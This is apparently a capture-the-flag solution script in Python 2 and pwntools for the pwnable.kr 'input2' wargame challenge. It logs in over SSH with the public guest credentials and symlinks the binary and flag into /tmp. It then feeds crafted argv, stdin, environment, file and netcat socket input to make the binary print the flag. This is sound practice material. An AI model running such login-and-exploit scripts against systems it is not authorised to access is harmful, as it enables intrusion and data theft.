from pwn import *

# input
host = 'pwnable.kr'
user = 'input2'
password = 'guest'
port = 2222

directory = '/tmp/fortenforge'
rport = "36789"

# Notes
#   * The trickiest part is stage 4. You need to create a new directory in
#     `/tmp` and then symlink both `flag` and `input`
#   * Then, in this new directory, you're free to create a new file that
#     `input` will read from

def attack():
  s = ssh(host=host, user=user, password=password, port=port)

  # switch to new directory and symlink flag and binary
  s.system("mkdir {}".format(directory))
  s.set_working_directory(directory)
  s.system("ln -s ~/input input")
  s.system("ln -s ~/flag flag")

  # **************
  # Pre-processing
  # **************

  # Stage 1: argv
  args = [''] * 100
  args[0] = './input'
  args[ord('A')] = "\x00"
  args[ord('B')] = "\x20\x0a\x0d"

  # Stage 2: stdio

  # Stage 3: env
  env = {"\xde\xad\xbe\xef" : "\xca\xfe\xba\xbe"}

  # Stage 4: file
  r = s.system("python")
  r.sendline("x = open('\\x0a', 'wb')")
  r.sendline("x.write('\\x00\\x00\\x00\\x00')")
  r.sendline("x.close()")
  r.sendline("exit()")
  r.close()

  # Stage 5: network
  args[ord('C')] = rport

  # *********
  # Execution
  # *********
  p = s.process(args, stderr=0, env=env)
  print p.recv().strip()

  # Stage 2: stdio
  p.send("\x00\x0a\x00\xff")
  p.send("\x00\x0a\x02\xff")

  # Stage 3: env
  print p.recv().strip()

  # Stage 4: file
  sleep(1)

  # Stage 5: network
  r = s.system("python -c \"print '\xde\xad\xbe\xef'\" | nc localhost 36789")
  print p.recvall()

if __name__ == '__main__':
  attack()
